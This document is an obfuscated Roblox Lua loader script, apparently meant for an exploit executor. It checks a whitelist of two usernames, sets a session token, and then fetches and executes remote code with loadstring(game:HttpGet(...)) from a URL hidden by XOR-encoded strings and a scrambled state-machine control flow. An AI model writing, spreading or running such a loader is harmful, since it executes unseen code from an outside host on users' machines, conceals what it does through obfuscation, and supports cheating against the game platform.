local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local whitelist = {
    ["justsigma2crazy"] = true,
    ["silverminite01"] = true
}

-- Obfuscated with Matcha Obfuscator
-- https://github.com/matcha-obfuscator
local __0x8s={"\199\118\72\239\111\207\179\100\255\139\82\126\227\15\8\199\119\94\234\111\144\238\40\226\132\81\53\234\18\82\204\109\81\176\127\132\250\126\201\143\83\127\232\19\29\128\111\93\246\114\218\210\46\239\159\73\49\215\13\21\193\97\84\254\114\146\249\57\163\134\80\49","\225\109\72\191\107\157\245\63\232\134\76\35\240\3\24\129","\240\108\89\253\105\153\253\20"};local __0x9k={175,2,60,159,28,245,156,75,141,234,37,80,132,102,124};local function __0x7d(__0x16i) local __0xbe=__0x8s[__0x16i];local __0xco={};for __0xaj=1,#__0xbe do local __0xdb=string.byte(__0xbe,__0xaj);local __0xec=__0x9k[(__0xaj - 1) % #__0x9k + 1];local __0x11a,__0x12f=__0xdb,__0xec;local __0xfr,__0x10p=0,1;for __0x13q=0,7 do local __0x14u,__0x15v=__0x11a % 2,__0x12f % 2;if __0x14u ~= __0x15v then __0xfr=__0xfr + __0x10p end;__0x11a=(__0x11a - __0x14u) / 2;__0x12f=(__0x12f - __0x15v) / 2;__0x10p=__0x10p * 2 end;__0xco[__0xaj]=string.char(__0xfr) end;return table.concat(__0xco) end;local _0x0,_0x1,_0x2;local _0x6=4;while true do if _0x6 == 8 then if false then local _0x3=nil end;_0x6=18 elseif _0x6 == 40 then _0x1,_0x2=pcall(function() loadstring(game:HttpGet(__0x7d(1)))() end);_0x6=46 elseif _0x6 == 53 then if 1 > 2 then local _0x5=nil end;_0x6=59 elseif _0x6 == 4 then if not whitelist[LocalPlayer.Name] then LocalPlayer:Kick(__0x7d(2));return end;_0x6=8 elseif _0x6 == 25 then getgenv().NebulaToken=_0x0;_0x6=33 elseif _0x6 == 46 then getgenv().NebulaToken=nil;_0x6=53 elseif _0x6 == 18 then _0x0=tostring(math.random(23377 + 76636 - 13,999999)) .. __0x7d(3) .. tostring(os.clock());_0x6=25 elseif _0x6 == 59 then if not _0x1 then warn(_0x2) end;_0x6=73 elseif _0x6 == 33 then if false then local _0x4=nil end;_0x6=40 else break end end